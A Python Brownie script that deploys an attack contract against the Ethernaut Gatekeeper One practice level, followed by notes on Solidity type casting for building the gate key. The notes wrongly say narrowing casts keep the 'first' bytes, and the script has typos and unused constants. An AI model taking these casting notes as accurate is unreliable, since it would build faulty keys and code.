from scripts.helpful_scripts import get_account
from brownie import web3, interface, Attack13


ETHERNAUT_INSTANCE = "0x52D9172066F788070Ca1F74A26F3aD2902282c37"
GAS_LIMIT = 6000000
GAS = 8191


def main():

    player = get_account()
    attack = Attack13.deploy(ETHERNAUT_INSTANCE, {"from": player})
    target = interface.IGatekeeperOne(ETHERNAUT_INSTANCE)

    attack.attack()

    # check that we've won by confirming that 'entrant' = player


# bytes    uint
#   1       8
#   2       16
#   4       32
#   8       64
#   16      128
#   20      160   <-- Ethereum address length
#   32      256


# GateThree - part 1
#
# uint64(bytes8)          -> bytes8 is reprepresented by uint64
# uint16(uint64)          -> returns first 2 of 8 bytes
# uint32(uint64)          -> uint32 of uint64 returns first 4 of 8 bytes

# GateThree - part 2
#
# uint64(bytes8)          -> reutrns bytes8 as a uint64
# uint32(uint64(bytes8))  -> bytes8 is reprepresented by uint64
#                         -> uint32 of uint64 returns first 4 of 8 bytes

# GateThree - part 3
#
# uint16(unit160)         -> reutrns first 2 of 20 bytes
# uint32(uint64(bytes8))  -> bytes8 is reprepresented by uint64
#                         -> uint32 of uint64 returns first 4 of 8 bytes
